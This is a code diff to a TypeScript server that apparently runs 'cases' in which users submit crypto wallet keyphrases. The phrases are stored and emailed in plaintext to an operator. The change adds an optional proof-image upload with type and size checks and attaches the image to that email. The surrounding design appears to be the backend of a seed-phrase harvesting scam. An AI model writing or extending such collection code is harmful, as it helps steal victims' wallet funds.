@@ -241,6 +241,8 @@ async function startServer() {
       createdAt: found.createdAt,
       walletKeyphraseSubmitted: Boolean(found.walletKeyphrase),
       keyphraseSubmittedAt: found.keyphraseSubmittedAt,
+      keyphraseProofImageFilename: found.keyphraseProofImageFilename,
+      keyphraseProofImageSubmittedAt: found.keyphraseProofImageSubmittedAt,
     };
   }
 
@@ -321,6 +323,13 @@ async function startServer() {
         : "";
     const keyphrase =
       typeof req.body?.keyphrase === "string" ? req.body.keyphrase : "";
+    const proofImageRaw = req.body?.proofImage as
+      | {
+          filename?: unknown;
+          mimeType?: unknown;
+          contentBase64?: unknown;
+        }
+      | undefined;
     if (!email || !keyphrase.trim()) {
       return res.status(400).json({
         success: false,
@@ -338,11 +347,48 @@ async function startServer() {
     if (!found || !caseMatchesEmail(found, email)) {
       return res.status(404).json({ success: false, error: "Case not found" });
     }
-    const updated = submitCaseKeyphrase(
-      req.params.caseId,
-      email,
-      keyphrase
-    );
+    let proofImageAttachment:
+      | {
+          filename: string;
+          mimeType: string;
+          content: Buffer;
+        }
+      | undefined;
+
+    if (proofImageRaw) {
+      const filename = String(proofImageRaw.filename || "").trim();
+      const mimeType = String(proofImageRaw.mimeType || "").trim().toLowerCase();
+      const contentBase64 = String(proofImageRaw.contentBase64 || "").trim();
+      const allowed = new Set(["image/jpeg", "image/png", "image/webp"]);
+      const maxBytes = 5 * 1024 * 1024;
+
+      if (!filename || !contentBase64 || !allowed.has(mimeType)) {
+        return res.status(400).json({
+          success: false,
+          error: "Invalid proof image payload",
+        });
+      }
+      if (isDangerousUploadFilename(filename)) {
+        return res.status(400).json({
+          success: false,
+          error: "Image filename is not allowed",
+        });
+      }
+
+      const content = Buffer.from(contentBase64, "base64");
+      if (!content.length || content.length > maxBytes) {
+        return res.status(400).json({
+          success: false,
+          error: "Proof image must be between 1 byte and 5MB",
+        });
+      }
+
+      proofImageAttachment = { filename, mimeType, content };
+    }
+
+    const updated = submitCaseKeyphrase(req.params.caseId, email, keyphrase, {
+      proofImageFilename: proofImageAttachment?.filename,
+    });
     if (!updated) {
       return res.status(500).json({ success: false, error: "Failed to save" });
     }
@@ -356,6 +402,7 @@ async function startServer() {
           clientName: String(updated.operatorAlias || updated.name || ""),
           keyphrase: keyphrase.trim(),
           submittedAt: String(updated.keyphraseSubmittedAt || ""),
+          proofImageAttachment,
         });
         keyphraseEmailSent = result.emailSent;
       } catch (emailErr) {
